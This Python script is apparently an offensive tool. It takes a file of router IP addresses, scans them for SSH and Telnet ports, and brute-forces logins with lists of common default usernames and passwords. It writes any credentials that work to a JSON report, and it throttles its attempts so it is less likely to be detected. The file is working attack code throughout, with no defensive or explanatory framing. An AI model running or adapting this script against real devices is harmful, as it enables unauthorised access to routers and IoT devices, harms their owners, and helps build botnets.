import paramiko
import pexpect
import concurrent.futures
import os
import json
import socket
import time

def scan_ports(ip, ports=[22, 2222, 443, 23, 2323]):
    """Scan for open ports before attempting brute force."""
    for port in ports:
        try:
            with socket.create_connection((ip, port), timeout=3):
                print(f"[INFO] Open port found: {ip}:{port}")
                return port
        except (socket.timeout, ConnectionRefusedError):
            continue
    return None

def ssh_bruteforce(ip, port, username, password):
    """Attempt SSH login using a set of credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"[INFO] Trying {username}:{password} on {ip}:{port} (SSH)")
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[SUCCESS] Found credentials: {username}:{password} on {ip}:{port} (SSH)")
        client.close()
        return {"ip": ip, "protocol": "SSH", "port": port, "username": username, "password": password}
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        print(f"[ERROR] SSH error on {ip}:{port}: {e}")
        return None

def telnet_bruteforce(ip, port, username, password):
    """Attempts Telnet login with given credentials using Pexpect."""
    try:
        print(f"[INFO] Trying {username}:{password} on {ip}:{port} (Telnet)")
        child = pexpect.spawn(f"telnet {ip} {port}", timeout=5)
        child.expect(["login:", pexpect.TIMEOUT, pexpect.EOF])
        child.sendline(username)
        child.expect(["Password:", pexpect.TIMEOUT, pexpect.EOF])
        child.sendline(password)
        response = child.expect(["incorrect", ">", "#", pexpect.TIMEOUT, pexpect.EOF])
        if response in [1, 2]:
            print(f"[SUCCESS] Telnet Login successful on {ip}:{port} -> {username}:{password}")
            child.sendline("exit")
            return {"ip": ip, "protocol": "Telnet", "port": port, "username": username, "password": password}
        else:
            return None
    except Exception as e:
        print(f"[ERROR] Telnet Connection error on {ip}:{port}: {e}")
        return None

def bruteforce():
    """Bruteforce SSH and Telnet credentials on scanned router IPs from scanned_ips.txt."""
    scanned_ips_file = "scanned_ips.txt"
    report_file = "bruteforce_report.json"
    
    if not os.path.exists(scanned_ips_file):
        print("[ERROR] scanned_ips.txt not found.")
        return
    
    with open(scanned_ips_file, "r") as file:
        ip_list = [line.strip() for line in file.readlines()]
    
    if not ip_list:
        print("[ERROR] No IPs found in scanned_ips.txt")
        return
    
    username_list = ["admin", "root", "user", "support", "guest", "test"]
    password_list = ["admin", "1234", "password", "root", "toor", "admin123", "default", "guest", "changeme", "letmein", "12345", "pass", "welcome"]
    
    results = []
    
    def attack(ip):
        port = scan_ports(ip)
        if not port:
            print(f"[INFO] No open ports found on {ip}")
            return
        
        for username in username_list:
            for password in password_list:
                time.sleep(1.5)  # Slow brute-force to avoid detection
                if port in [22, 2222, 443]:
                    result = ssh_bruteforce(ip, port, username, password)
                else:
                    result = telnet_bruteforce(ip, port, username, password)
                
                if result:
                    results.append(result)
                    return
        print(f"[FAILED] No valid credentials for {ip}:{port}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(attack, ip_list)
    
    with open(report_file, "w") as file:
        json.dump(results, file, indent=4)
    
    print(f"[INFO] Bruteforce report saved to {report_file}")

if __name__ == "__main__":
    bruteforce()
